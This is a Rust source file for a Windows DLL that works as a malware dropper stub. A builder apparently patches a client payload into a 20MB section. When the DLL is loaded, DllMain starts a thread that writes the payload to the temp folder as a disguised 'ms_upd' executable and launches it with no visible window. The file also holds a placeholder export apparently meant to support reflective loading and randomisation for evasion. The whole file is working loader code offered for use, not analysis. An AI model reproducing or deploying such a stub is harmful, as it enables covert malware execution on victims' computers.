use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::thread;
use winapi::um::winnt::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use winapi::shared::minwindef::{HINSTANCE, DWORD, LPVOID, BOOL, TRUE};

// This will be patched by the builder
// 20MB buffer for the client payload
#[link_section = ".payload"]
static PAYLOAD: [u8; 20 * 1024 * 1024] = {
    let mut b = [0u8; 20 * 1024 * 1024];
    let marker = b"PAYLOAD_MARKER_PLACEHOLDER";
    let mut i = 0;
    while i < marker.len() {
        b[i] = marker[i];
        i += 1;
    }
    b
};

#[link_section = ".config"]
static CONFIG: [u8; 1024] = *b"CONF_MARKER_PLACEHOLDER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn run_payload() {
    let mut temp_path = std::env::temp_dir();
    let payload_name = format!("ms_upd_{}.exe", std::process::id());
    temp_path.push(payload_name);

    if !temp_path.exists() {
        if let Ok(mut file) = File::create(&temp_path) {
            let _ = file.write_all(&PAYLOAD);
            let _ = file.flush();
            drop(file);
        }
    }

    if temp_path.exists() {
        let mut child = Command::new(&temp_path)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();

        let config_str = std::str::from_utf8(&CONFIG).unwrap_or("");
        let is_volatile = config_str.contains("VOLATILE=TRUE");

        if is_volatile {
            if let Ok(mut child) = child {
                // If volatile, we want to kill the child when the host process exits.
                // Since this DLL is in the host process, when the host dies, we also die.
                // However, we can use a Job Object to ensure the child is terminated by the OS.
                unsafe {
                    use winapi::um::winbase::{CreateJobObjectA, AssignProcessToJobObject};
                    use winapi::um::jobapi2::SetInformationJobObject;
                    use winapi::um::winnt::{
                        JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
                        JobObjectExtendedLimitInformation,
                        JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
                    };
                    use std::os::windows::io::AsRawHandle;

                    let job = CreateJobObjectA(std::ptr::null_mut(), std::ptr::null());
                    if !job.is_null() {
                        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
                        info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

                        SetInformationJobObject(
                            job,
                            JobObjectExtendedLimitInformation,
                            &mut info as *mut _ as *mut _,
                            std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32
                        );

                        AssignProcessToJobObject(job, child.as_raw_handle() as *mut _);

                        // Keep job handle open as long as we want the limit to apply.
                        // In a DLL, we can just leak it or store it in a static.
                        Box::leak(Box::new(job));
                    }
                }
                let _ = child.wait();
            }
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
pub extern "system" fn DllMain(
    hinst_dll: HINSTANCE,
    fdw_reason: DWORD,
    lpv_reserved: LPVOID,
) -> BOOL {
    if fdw_reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            run_payload();
        });
    }
    TRUE
}

// Dummy export to be randomized
#[no_mangle]
pub extern "C" fn ReflectiveInit() {
    // This exists to provide an export for the DLL
}
